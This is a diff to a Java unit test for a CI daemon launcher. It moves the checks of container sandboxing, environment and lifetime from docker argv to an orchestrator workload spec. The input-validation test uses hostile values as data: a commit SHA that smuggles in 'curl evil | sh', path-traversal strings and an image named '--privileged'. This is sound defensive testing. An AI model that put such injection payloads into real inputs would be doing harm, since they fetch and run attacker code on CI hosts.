@@ -2,33 +2,39 @@ package eu.wohlben.qits.ci.daemonhost;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
+import static org.junit.jupiter.api.Assertions.assertNotEquals;
 import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
+import eu.wohlben.qits.containers.client.ContainersWire.EnsureRequest;
+import eu.wohlben.qits.containers.client.ContainersWire.Policy;
+import eu.wohlben.qits.containers.client.ContainersWire.Recreate;
+import eu.wohlben.qits.containers.client.ContainersWire.Security;
+import eu.wohlben.qits.containers.client.ContainersWire.Spec;
 import eu.wohlben.qits.ci.daemonhost.CiDaemonLauncher.LaunchSpec;
 import eu.wohlben.qits.ci.error.BadRequestException;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.util.ArrayList;
-import java.util.Arrays;
+import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
-import java.util.logging.Handler;
-import java.util.logging.Level;
-import java.util.logging.LogRecord;
 import org.junit.jupiter.api.Test;
 
 /**
- * Argv and bootstrap assembly only — the real {@code docker run} is covered by the extended {@code
- * CiDaemonHandshakeIT}. Worth its own test because the argv <b>is</b> the sandbox: a flag lost in a
- * refactor is invisible everywhere else until it is invisible in production.
+ * Workload-spec and bootstrap assembly only — a real orchestrator is {@code CiDaemonGateIT}'s
+ * subject and the HTTP reading of its four answers is {@code CiDaemonLauncherContainersTest}'s.
+ * Worth its own test because the spec <b>is</b> the sandbox: a field lost in a refactor is invisible
+ * everywhere else until it is invisible in production.
+ *
+ * <p><b>The assertion is the whole request, by equality.</b> It used to be the whole argv, a flat
+ * list of eighty strings; the same claim over a record tree is one {@code assertEquals} against a
+ * literal, and it still fails when a field goes missing rather than when someone remembers to check
+ * for it.
  *
  * <p><b>Deliberately does not exercise {@link CiDaemonLauncher#daemonVersion()}.</b> That method
  * delegates to the injected {@code CiDaemonPins} ladder (ci-daemon-autoadopt-plan.md, workstream
  * BV), a real CDI bean this plain-construction test never wires up; its coverage lives in
- * {@code CiDaemonPinsTest} and {@code CiDaemonPinTest} instead. This class stays about pure argv
+ * {@code CiDaemonPinsTest} and {@code CiDaemonPinTest} instead. This class stays about pure spec
  * assembly, which is why it can be {@code new CiDaemonLauncher()} with fields set by hand rather
- * than a {@code @QuarkusTest}.
+ * than a {@code @QuarkusTest} — and why it needs no client at all: nothing here sends anything.
  */
 public class CiDaemonLauncherTest {
 
@@ -38,17 +44,19 @@ public class CiDaemonLauncherTest {
 
   private CiDaemonLauncher launcher(String containerGitUrl) {
     CiDaemonLauncher launcher = new CiDaemonLauncher();
-    launcher.runtime = "docker";
+    launcher.owner = "dev-qits-ci";
     launcher.network = "qits-net";
     launcher.containerGitUrl = containerGitUrl;
     launcher.containerDaemonUrl = "ws://qits-ci:8080/ci/daemon";
     launcher.daemonBinaryUrlTemplate = "http://qits-artifacts:8080/artifacts/daemons/qits-ci-daemon/{version}";
     launcher.registerTimeoutSeconds = 60;
+    launcher.initTimeoutSeconds = 120;
+    launcher.stepTimeoutSeconds = 900;
+    launcher.stepTimeoutGraceSeconds = 60;
     launcher.outputMaxChars = 65536;
     launcher.memoryLimit = "4g";
-    launcher.pidsLimit = "2048";
+    launcher.pidsLimit = 2048;
     launcher.cpus = "2";
-    launcher.dockerSocketPath = "/var/run/docker.sock";
     launcher.artifactsRegistryHost = "qits-artifacts:8080";
     launcher.artifactsImageRepository = "qits";
     launcher.artifactsNpmHostedUrl = "http://qits-artifacts:8080/artifacts/npm/npm/";
@@ -70,122 +78,142 @@ public class CiDaemonLauncherTest {
           "daemon-7",
           "s3cr3t",
           "http://qits-artifacts:8080/artifacts/daemons/qits-ci-daemon/deadbeef",
+          0,
           false,
           Map.of());
 
   /** The same step, having declared {@code docker: true} — the only difference anywhere. */
   private LaunchSpec publishing() {
-    return new LaunchSpec(
-        spec.runId(),
-        spec.stepIndex(),
-        spec.repoId(),
-        spec.branch(),
-        spec.sha(),
-        spec.image(),
-        spec.daemonId(),
-        spec.secret(),
-        spec.daemonBinaryUrl(),
-        true,
-        spec.env());
+    return withDocker(spec, true);
   }
 
+  private static LaunchSpec withDocker(LaunchSpec original, boolean docker) {
+    return new LaunchSpec(
+        original.runId(),
+        original.stepIndex(),
+        original.repoId(),
+        original.branch(),
+        original.sha(),
+        original.image(),
+        original.daemonId(),
+        original.secret(),
+        original.daemonBinaryUrl(),
+        original.stepTimeoutSeconds(),
+        docker,
+        original.env());
+  }
+
+  /** The environment every step container gets, in the order the spec writes it. */
+  private static Map<String, String> contractEnv() {
+    Map<String, String> env = new LinkedHashMap<>();
+    env.put("QITS_CI_DAEMON_ID", "daemon-7");
+    env.put("QITS_CI_DAEMON_SECRET", "s3cr3t");
+    env.put("QITS_CI_DAEMON_URL", "ws://qits-ci:8080/ci/daemon");
+    env.put(
+        "QITS_CI_DAEMON_BINARY_URL",
+        "http://qits-artifacts:8080/artifacts/daemons/qits-ci-daemon/deadbeef");
+    env.put("QITS_CI_REPOSITORY_URL", "http://qits-githost:8080/git/repo-1");
+    env.put("QITS_CI_BRANCH", "main");
+    env.put("QITS_CI_SHA", "cafebabe");
+    env.put("QITS_CI_REPO_ID", "repo-1");
+    env.put("CI", "true");
+    env.put("QITS_CI", "true");
+    env.put("QITS_REGISTRY", "qits-artifacts:8080");
+    env.put("QITS_IMAGE_REPOSITORY", "qits");
+    env.put("QITS_NPM_REGISTRY_URL", "http://qits-artifacts:8080/artifacts/npm/npm/");
+    env.put("QITS_NPM_PROXY_URL", "http://qits-artifacts:8080/artifacts/npm/npmjs/");
+    env.put("QITS_MAVEN_REGISTRY_URL", "http://qits-artifacts:8080/artifacts/maven/maven");
+    env.put("QITS_DOCS_URL", "http://qits-artifacts:8080/artifacts/docs/docs");
+    env.put("QITS_WORKSPACES_URL", "http://qits-workspaces:8080");
+    return env;
+  }
+
+  /**
+   * The whole request, written out. Every field is here on purpose, including the six that are
+   * {@code null}: what an absent list or an unset pull policy means is the orchestrator's default,
+   * and a literal that skipped them would pass just as happily against a spec that had started
+   * sending something.
+   */
   @Test
-  public void buildsTheDetachedDockerRunArgv() {
+  public void buildsTheWholeWorkloadSpec() {
     assertEquals(
-        List.of(
-            "docker",
-            "run",
-            "-d",
-            "--name",
-            "qits-ci-01234567-412621e6-2",
-            "--network",
-            "qits-net",
-            "--add-host=host.docker.internal:host-gateway",
-            "--label",
-            "qits.ci.run=0123456789abcdef-run",
-            "--security-opt=no-new-privileges",
-            "--cap-drop=ALL",
-            "--memory",
-            "4g",
-            "--memory-swap",
-            "4g",
-            "--pids-limit",
-            "2048",
-            "--cpus",
-            "2",
-            "--env",
-            "QITS_CI_DAEMON_ID=daemon-7",
-            "--env",
-            "QITS_CI_DAEMON_SECRET=s3cr3t",
-            "--env",
-            "QITS_CI_DAEMON_URL=ws://qits-ci:8080/ci/daemon",
-            "--env",
-            "QITS_CI_DAEMON_BINARY_URL=http://qits-artifacts:8080/artifacts/daemons/qits-ci-daemon/deadbeef",
-            "--env",
-            "QITS_CI_REPOSITORY_URL=http://qits-githost:8080/git/repo-1",
-            "--env",
-            "QITS_CI_BRANCH=main",
-            "--env",
-            "QITS_CI_SHA=cafebabe",
-            "--env",
-            "QITS_CI_REPO_ID=repo-1",
-            "--env",
-            "CI=true",
-            "--env",
-            "QITS_CI=true",
-            "--env",
-            "QITS_REGISTRY=qits-artifacts:8080",
-            "--env",
-            "QITS_IMAGE_REPOSITORY=qits",
-            "--env",
-            "QITS_NPM_REGISTRY_URL=http://qits-artifacts:8080/artifacts/npm/npm/",
-            "--env",
-            "QITS_NPM_PROXY_URL=http://qits-artifacts:8080/artifacts/npm/npmjs/",
-            "--env",
-            "QITS_MAVEN_REGISTRY_URL=http://qits-artifacts:8080/artifacts/maven/maven",
-            "--env",
-            "QITS_DOCS_URL=http://qits-artifacts:8080/artifacts/docs/docs",
-            "--env",
-            "QITS_WORKSPACES_URL=http://qits-workspaces:8080",
-            "--entrypoint",
-            "/bin/sh",
-            "maven:3.9",
-            "-c",
-            CiDaemonLauncher.BOOTSTRAP),
-        launcher().buildArgv(spec));
+        new EnsureRequest(
+            new Spec(
+                "maven:3.9",
+                List.of("/bin/sh"),
+                List.of("-c", CiDaemonLauncher.BOOTSTRAP),
+                contractEnv(),
+                Map.of("qits.ci.run", "0123456789abcdef-run"),
+                "qits-net",
+                null,
+                List.of("host.docker.internal:host-gateway"),
+                null,
+                null,
+                false,
+                new Security(true, true, "4g", "4g", 2048L, "2"),
+                null,
+                "qits-ci-01234567-412621e6-2"),
+            // 60 register + 120 initialize + 900 default step + 60 grace + 900 slop.
+            Policy.ephemeral(2040L),
+            Recreate.never),
+        launcher().buildWorkloadSpec(spec));
   }
 
   @Test
   public void aStepThatDeclaredDockerGetsTheHostSocketAndOnlyThat() {
-    List<String> plain = launcher().buildArgv(spec);
-    List<String> withDocker = launcher().buildArgv(publishing());
+    EnsureRequest plain = launcher().buildWorkloadSpec(spec);
+    EnsureRequest withDocker = launcher().buildWorkloadSpec(publishing());
 
-    // The mount is there, at the same path on both sides so the step image's CLI finds it by default.
-    int mount = withDocker.indexOf("-v");
-    assertTrue(mount >= 0, withDocker.toString());
-    assertEquals("/var/run/docker.sock:/var/run/docker.sock", withDocker.get(mount + 1));
+    // The flag is set, and the orchestrator is what turns it into a mount at the path the step
+    // image's CLI looks at — which is why there is no path in this request at all any more.
+    assertTrue(withDocker.spec().hostDockerSocket());
 
-    // And it is the ONLY difference: the sandbox does not relax for a publish step, because cap-drop
-    // and no-new-privileges cost a socket client nothing and keeping them unconditional is what keeps
-    // them meaning something for the steps that never opt in.
-    List<String> withoutTheMount = new java.util.ArrayList<>(withDocker);
-    withoutTheMount.subList(mount, mount + 2).clear();
-    assertEquals(plain, withoutTheMount, "declaring docker must add a mount and change nothing else");
-    assertTrue(withDocker.contains("--cap-drop=ALL"), withDocker.toString());
-    assertTrue(withDocker.contains("--security-opt=no-new-privileges"), withDocker.toString());
+    // And it is the ONLY difference: the sandbox does not relax for a publish step, because
+    // capDropAll and noNewPrivileges cost a socket client nothing and keeping them unconditional is
+    // what keeps them meaning something for the steps that never opt in. Asserted as an
+    // exactly-one-field diff rather than as two spot checks — the same claim the old argv test made
+    // by deleting two list elements and comparing the rest.
+    assertNotEquals(plain, withDocker);
+    assertEquals(plain, new EnsureRequest(withoutSocket(withDocker.spec()), withDocker.policy(), withDocker.recreate()));
+    assertTrue(withDocker.spec().security().capDropAll());
+    assertTrue(withDocker.spec().security().noNewPrivileges());
+  }
+
+  /** The one field under test, put back to what a step that declared nothing would have sent. */
+  private static Spec withoutSocket(Spec original) {
+    return new Spec(
+        original.image(),
+        original.entrypoint(),
+        original.args(),
+        original.env(),
+        original.extraLabels(),
+        original.network(),
+        original.aliases(),
+        original.addHosts(),
+        original.volumeMounts(),
+        original.sharedMounts(),
+        false,
+        original.security(),
+        original.pullPolicy(),
+        original.explicitName());
   }
 
   @Test
   public void aStepThatDeclaredNothingGetsNoDockerSocketAtAll() {
     // THIS is the security assertion of the pair — the absence, not the presence. A step's script is
     // repo-controlled code and the docker socket is root on the host, so "no socket unless the config
-    // said so" is the invariant, and an accidental unconditional mount would be invisible everywhere
+    // said so" is the invariant, and an accidental unconditional flag would be invisible everywhere
     // else in this repository until it was invisible in production.
-    List<String> argv = launcher().buildArgv(spec);
-    assertFalse(argv.contains("-v"), argv.toString());
-    assertFalse(argv.contains("--volume"), argv.toString());
-    for (String arg : argv) {
-      assertFalse(arg.contains("docker.sock"), "no step may see a docker socket it did not ask for: " + arg);
+    Spec workload = launcher().buildWorkloadSpec(spec).spec();
+    assertFalse(workload.hostDockerSocket());
+    // And nothing else may smuggle one in: a mount list, or a socket path hidden in an environment
+    // value the daemon would find.
+    assertEquals(null, workload.volumeMounts());
+    assertEquals(null, workload.sharedMounts());
+    for (Map.Entry<String, String> entry : workload.env().entrySet()) {
+      assertFalse(
+          entry.getValue().contains("docker.sock"),
+          "no step may see a docker socket it did not ask for: " + entry);
     }
   }
 
@@ -195,10 +223,10 @@ public class CiDaemonLauncherTest {
     // repository's pipeline. With $QITS_CI_SHA these two are the whole tag convention qits-cd pulls
     // by, and they are named after their owner because qits-cd ships the same pair.
     for (LaunchSpec each : List.of(spec, publishing())) {
-      List<String> argv = launcher().buildArgv(each);
-      assertTrue(argv.contains("QITS_REGISTRY=qits-artifacts:8080"), argv.toString());
-      assertTrue(argv.contains("QITS_IMAGE_REPOSITORY=qits"), argv.toString());
-      assertTrue(argv.contains("QITS_CI_SHA=cafebabe"), argv.toString());
+      Map<String, String> env = launcher().buildWorkloadSpec(each).spec().env();
+      assertEquals("qits-artifacts:8080", env.get("QITS_REGISTRY"));
+      assertEquals("qits", env.get("QITS_IMAGE_REPOSITORY"));
+      assertEquals("cafebabe", env.get("QITS_CI_SHA"));
     }
   }
 
@@ -209,24 +237,18 @@ public class CiDaemonLauncherTest {
     // an ordinary HTTP step that never declares `docker: true`, and the in-network alias is the
     // value that is CORRECT here rather than the one a host-published mapping replaces.
     for (LaunchSpec each : List.of(spec, publishing())) {
-      List<String> argv = launcher().buildArgv(each);
-      assertTrue(
-          argv.contains("QITS_NPM_REGISTRY_URL=http://qits-artifacts:8080/artifacts/npm/npm/"),
-          argv.toString());
-      assertTrue(
-          argv.contains("QITS_NPM_PROXY_URL=http://qits-artifacts:8080/artifacts/npm/npmjs/"),
-          argv.toString());
+      Map<String, String> env = launcher().buildWorkloadSpec(each).spec().env();
+      assertEquals("http://qits-artifacts:8080/artifacts/npm/npm/", env.get("QITS_NPM_REGISTRY_URL"));
+      assertEquals("http://qits-artifacts:8080/artifacts/npm/npmjs/", env.get("QITS_NPM_PROXY_URL"));
     }
   }
 
   @Test
   public void everyStepIsToldWhereMavenPackagesComeFromAndGoTo() {
     for (LaunchSpec each : List.of(spec, publishing())) {
-      List<String> argv = launcher().buildArgv(each);
-      assertTrue(
-          argv.contains(
-              "QITS_MAVEN_REGISTRY_URL=http://qits-artifacts:8080/artifacts/maven/maven"),
-          argv.toString());
+      assertEquals(
+          "http://qits-artifacts:8080/artifacts/maven/maven",
+          launcher().buildWorkloadSpec(each).spec().env().get("QITS_MAVEN_REGISTRY_URL"));
     }
   }
 
@@ -235,10 +257,9 @@ public class CiDaemonLauncherTest {
     // Including the `docs` namespace segment: there is one docs repository and a pipeline that got
     // to name one could publish into a namespace nothing serves.
     for (LaunchSpec each : List.of(spec, publishing())) {
-      List<String> argv = launcher().buildArgv(each);
-      assertTrue(
-          argv.contains("QITS_DOCS_URL=http://qits-artifacts:8080/artifacts/docs/docs"),
-          argv.toString());
+      assertEquals(
+          "http://qits-artifacts:8080/artifacts/docs/docs",
+          launcher().buildWorkloadSpec(each).spec().env().get("QITS_DOCS_URL"));
     }
   }
 
@@ -248,19 +269,102 @@ public class CiDaemonLauncherTest {
     // green. Unconditional and container-dialled for the same reasons as the npm pair: the file
     // states no deployment fact, and the in-network alias is what a step container can reach.
     for (LaunchSpec each : List.of(spec, publishing())) {
-      assertTrue(
-          launcher().buildArgv(each).contains("QITS_WORKSPACES_URL=http://qits-workspaces:8080"),
-          launcher().buildArgv(each).toString());
+      assertEquals(
+          "http://qits-workspaces:8080",
+          launcher().buildWorkloadSpec(each).spec().env().get("QITS_WORKSPACES_URL"));
     }
   }
 
+  /**
+   * <b>The run's own extras are written last and the platform's contract first.</b> Today the map is
+   * the four {@code QITS_EVENT_*} of an event-triggered run and empty on every push, and none of it
+   * is repo-authored — so this pins the ORDER rather than a safety property, exactly as the argv
+   * did: last in the argv meant a repeated {@code --env} whose later value won, and last into a map
+   * means the same thing.
+   */
   @Test
-  public void theContainerIsDetachedAndNotSelfRemoving() {
-    List<String> argv = launcher().buildArgv(spec);
-    assertTrue(argv.contains("-d"), argv.toString());
-    // --rm would race the `docker logs` capture that is the only diagnosis a container which never
-    // registered can offer; every teardown is an explicit `docker rm -f` instead.
-    assertFalse(argv.contains("--rm"), argv.toString());
+  public void runScopedExtrasAreWrittenAfterTheContractAndInSortedOrder() {
+    LaunchSpec triggered =
+        new LaunchSpec(
+            spec.runId(),
+            spec.stepIndex(),
+            spec.repoId(),
+            spec.branch(),
+            spec.sha(),
+            spec.image(),
+            spec.daemonId(),
+            spec.secret(),
+            spec.daemonBinaryUrl(),
+            spec.stepTimeoutSeconds(),
+            false,
+            Map.of("QITS_EVENT_VERSION", "1.2.3", "QITS_EVENT_NAME", "SoftwareRelease"));
+
+    Map<String, String> expected = contractEnv();
+    expected.put("QITS_EVENT_NAME", "SoftwareRelease");
+    expected.put("QITS_EVENT_VERSION", "1.2.3");
+
+    Map<String, String> actual = launcher().buildWorkloadSpec(triggered).spec().env();
+    assertEquals(expected, actual);
+    assertEquals(List.copyOf(expected.keySet()), List.copyOf(actual.keySet()), "written in this order");
+  }
+
+  /**
+   * <b>The lifetime the registry collects at is a sum of deadlines, never a guess.</b> A step that
+   * declares its own {@code timeout-seconds} moves it; a step that declares none gets the configured
+   * default in the same sum. The slop is what keeps this a backstop rather than a second timeout —
+   * every deadline in the sum is enforced by something that reports what it enforced, and a maxAge
+   * that could fire first would take a container away mid-step.
+   */
+  @Test
+  public void theRegistryLifetimeCoversEveryDeadlineAStepMaySpend() {
+    LaunchSpec longStep =
+        new LaunchSpec(
+            spec.runId(),
+            spec.stepIndex(),
+            spec.repoId(),
+            spec.branch(),
+            spec.sha(),
+            spec.image(),
+            spec.daemonId(),
+            spec.secret(),
+            spec.daemonBinaryUrl(),
+            3600,
+            false,
+            Map.of());
+    // 60 + 120 + 3600 + 60 + 900
+    assertEquals(4740L, launcher().maxAgeSeconds(longStep));
+    // A step that declared nothing falls back to qits.ci.step-timeout-seconds, not to zero.
+    assertEquals(2040L, launcher().maxAgeSeconds(spec));
+    assertEquals(
+        Policy.ephemeral(4740L), launcher().buildWorkloadSpec(longStep).policy());
+  }
+
+  /**
+   * <b>The container name is the ref, and one place per step of one run is what that buys.</b> The
+   * registry's identity is owner/workload/ref with one live row per triple, so a retry of the same
+   * step has to address the same row rather than make a second one — which is a property of the name
+   * being derived from the run and the step index and nothing else.
+   */
+  @Test
+  public void theContainerNameIsAlsoTheRefAndIsStableForOneStep() {
+    String name = CiDaemonLauncher.containerName(spec.runId(), spec.stepIndex());
+    assertEquals(name, launcher().buildWorkloadSpec(spec).spec().explicitName());
+    assertEquals(name, CiDaemonLauncher.containerName(spec.runId(), spec.stepIndex()));
+    assertNotEquals(name, CiDaemonLauncher.containerName(spec.runId(), spec.stepIndex() + 1));
+    // ContainersIdentifiers' charset for a ref: lowercase, alphanumerics and dashes, no leading one.
+    assertTrue(name.matches("[a-z0-9][a-z0-9-]*"), name);
+  }
+
+  @Test
+  public void theContainerIsNotSelfRemoving() {
+    // There is no way to ask for one: the wire has no --rm, and the policy is EPHEMERAL, which is
+    // about what may REPLACE the container rather than about it removing itself. A self-removing
+    // container would race the log capture that is the only diagnosis a container which never
+    // registered can offer; every teardown is an explicit delete instead.
+    assertEquals(
+        eu.wohlben.qits.containers.client.ContainersWire.PolicyType.EPHEMERAL,
+        launcher().buildWorkloadSpec(spec).policy().type());
+    assertEquals(Recreate.never, launcher().buildWorkloadSpec(spec).recreate());
   }
 
   @Test
@@ -272,7 +376,10 @@ public class CiDaemonLauncherTest {
         List.of("repo-1", "cafebabe", "main", "daemon-7", "s3cr3t", "maven:3.9", "qits-artifacts")) {
       assertFalse(bootstrap.contains(value), "bootstrap must not carry '" + value + "'");
     }
-    assertEquals(bootstrap, launcher().buildArgv(spec).getLast());
+    // ...and it travels as ITS OWN list element, which is what makes zero interpolation a property
+    // of the construction rather than of an argv somebody has to keep reading.
+    assertEquals(List.of("-c", bootstrap), launcher().buildWorkloadSpec(spec).spec().args());
+    assertEquals(List.of("/bin/sh"), launcher().buildWorkloadSpec(spec).spec().entrypoint());
     // ...and the invariant the whole feature rests on: no repo-controlled code in a host argv.
     assertFalse(bootstrap.contains("bash -c"), bootstrap);
     assertFalse(bootstrap.contains("docker"), bootstrap);
@@ -284,10 +391,10 @@ public class CiDaemonLauncherTest {
     assertTrue(bootstrap.contains("command -v wget"), bootstrap);
     assertTrue(bootstrap.contains("command -v curl"), bootstrap);
     // The image contract, stated in the container's own log — which is what the never-registered
-    // reap captures, so an image missing a downloader diagnoses itself.
+    // teardown captures, so an image missing a downloader diagnoses itself.
     assertTrue(bootstrap.contains("neither wget nor curl"), bootstrap);
     assertTrue(bootstrap.contains("chmod +x /tmp/qits-ci-daemon"), bootstrap);
-    // exec, so the daemon is PID 1 and a `docker rm -f` signals it rather than a wrapping shell.
+    // exec, so the daemon is PID 1 and the removal signals it rather than a wrapping shell.
     assertTrue(bootstrap.contains("exec /tmp/qits-ci-daemon"), bootstrap);
   }
 
@@ -316,27 +423,33 @@ public class CiDaemonLauncherTest {
         launcher("http://a-host-of-any-depth/below").cloneUrl("repo-1"));
   }
 
+  /**
+   * <b>Pre-flight, and that is not made redundant by the orchestrator checking again.</b> Every one
+   * of these throws before the client is touched — which this test proves by construction, since the
+   * launcher it builds has no client at all and a call that reached one would NPE rather than throw
+   * a {@code BadRequestException}. Two checkpoints, one rule each side owns: a refusal here names
+   * the field to the run, a refusal there is a 400 nothing retries out of.
+   */
   @Test
-  public void hostileIdentifiersAreRejectedBeforeAnyDockerCall() {
+  public void hostileIdentifiersAreRejectedBeforeAnyCallIsMade() {
     CiDaemonLauncher launcher = launcher();
     LaunchSpec injectedSha =
-        new LaunchSpec("run", 0, "repo-1", "main", "x\"; curl evil | sh #", "img", "d", "s", "u", false, Map.of());
+        new LaunchSpec("run", 0, "repo-1", "main", "x\"; curl evil | sh #", "img", "d", "s", "u", 0, false, Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(injectedSha));
     LaunchSpec traversal =
-        new LaunchSpec("run", 0, "../../etc", "main", "cafebabe", "img", "d", "s", "u", false, Map.of());
+        new LaunchSpec("run", 0, "../../etc", "main", "cafebabe", "img", "d", "s", "u", 0, false, Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(traversal));
     LaunchSpec injectedBranch =
-        new LaunchSpec("run", 0, "repo-1", "main/../..", "cafebabe", "img", "d", "s", "u", false, Map.of());
+        new LaunchSpec("run", 0, "repo-1", "main/../..", "cafebabe", "img", "d", "s", "u", 0, false, Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(injectedBranch));
-    // The image is repo-declared rather than intake-supplied, and it is a positional argument to the
-    // docker CLI. Nothing is known to get through it — ProcessBuilder does not shell-split and the
-    // trailing `-c <BOOTSTRAP>` defeats the obvious re-parses — but an argument that can be read as
-    // an option is not a thing to leave to the parser's good manners.
+    // The image is repo-declared rather than intake-supplied, and it still reaches a docker argv on
+    // the far side of the wire. Nothing is known to get through it, but an argument that can be read
+    // as an option is not a thing to leave to another service's good manners.
     LaunchSpec optionShapedImage =
-        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "--privileged", "d", "s", "u", false, Map.of());
+        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "--privileged", "d", "s", "u", 0, false, Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(optionShapedImage));
     LaunchSpec blankImage =
-        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "  ", "d", "s", "u", false, Map.of());
+        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "  ", "d", "s", "u", 0, false, Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(blankImage));
   }
 
@@ -378,88 +491,11 @@ public class CiDaemonLauncherTest {
         "two distinct probe runIds must not collide on the container name");
   }
 
-  /**
-   * <b>A docker the boot sweep cannot reach must say so.</b> The success path logs only a positive
-   * count, so while the failure was a DEBUG the two outcomes an operator most needs to tell apart —
-   * "there was nothing to sweep" and "the sweep never ran, so the orphans are still there" — left
-   * exactly the same (empty) log. Both cases are asserted here together, because the claim is about
-   * the difference between them and not about either line on its own.
-   *
-   * <p>The fake docker is a two-line shell script on {@code runtime}: this class already wires that
-   * field by hand, so nothing has to be stubbed inside {@code CiProcess} to make the CLI fail — the
-   * real process really runs and really exits non-zero.
-   */
-  @Test
-  public void aDockerThatCannotBeReachedWarnsInsteadOfLookingLikeAnEmptyHost() throws Exception {
-    String complaint = "Cannot connect to the Docker daemon at unix:///var/run/docker.sock.";
-    CiDaemonLauncher launcher = launcher();
-    launcher.runtime = fakeDocker("echo '" + complaint + "' >&2\nexit 3\n").toString();
-
-    List<String> warnings = new ArrayList<>();
-    Handler capture = captureWarnings(warnings);
-    java.util.logging.Logger launcherLog =
-        java.util.logging.Logger.getLogger(CiDaemonLauncher.class.getName());
-    launcherLog.addHandler(capture);
-    try {
-      assertEquals(0, launcher.reapOrphans(), "a boot must not fail because docker is down");
-      assertEquals(1, warnings.size(), "one WARN, naming the failure: " + warnings);
-      String warning = warnings.getFirst();
-      assertTrue(warning.contains("exited 3"), "the exit code belongs in it: " + warning);
-      assertTrue(warning.contains(complaint), "so does docker's own words: " + warning);
-
-      // And the other half of the claim: a docker that answers with an empty list is silent, so the
-      // WARN above means "could not sweep" rather than "swept nothing".
-      warnings.clear();
-      launcher.runtime = fakeDocker("exit 0\n").toString();
-      assertEquals(0, launcher.reapOrphans());
-      assertEquals(List.of(), warnings, "an empty host is not a problem and must not warn");
-    } finally {
-      launcherLog.removeHandler(capture);
-    }
-  }
-
-  /** An executable standing in for the docker CLI, running the given script body. */
-  private static Path fakeDocker(String body) throws Exception {
-    Path script = Files.createTempFile("qits-fake-docker", ".sh");
-    Files.writeString(script, "#!/bin/sh\n" + body);
-    script.toFile().setExecutable(true);
-    script.toFile().deleteOnExit();
-    return script;
-  }
-
-  private static Handler captureWarnings(List<String> into) {
-    return new Handler() {
-      @Override
-      public void publish(LogRecord record) {
-        if (record.getLevel().intValue() >= Level.WARNING.intValue()) {
-          into.add(rendered(record));
-        }
-      }
-
-      @Override
-      public void flush() {}
-
-      @Override
-      public void close() {}
-    };
-  }
-
-  /**
-   * {@code LOG.warnf} hands the log manager a printf format plus its arguments and leaves the
-   * rendering to the handler, so the assertions above have to do that rendering themselves. A
-   * provider that formats eagerly leaves no parameters, and then the message is already the answer.
-   */
-  private static String rendered(LogRecord record) {
-    Object[] parameters = record.getParameters();
-    if (parameters == null || parameters.length == 0) {
-      return record.getMessage();
-    }
-    try {
-      return String.format(record.getMessage(), parameters);
-    } catch (RuntimeException e) {
-      return record.getMessage() + " " + Arrays.toString(parameters);
-    }
-  }
+  // The docker-is-down WARN that used to live here went with the CLI it was about: there is no
+  // `docker ps` to exit non-zero any more. Its successor is the boot reap's own patience window,
+  // asserted in CiDaemonLauncherContainersTest against an orchestrator that answers nothing — the
+  // same claim (a teardown that could not run says so and boots anyway) about the call that
+  // replaced it.
 
   // The boot-time shape check that used to live here (daemonVersionComplaint) is gone with the
   // template flip: it warned only while the shipped template still addressed the binary by digest,
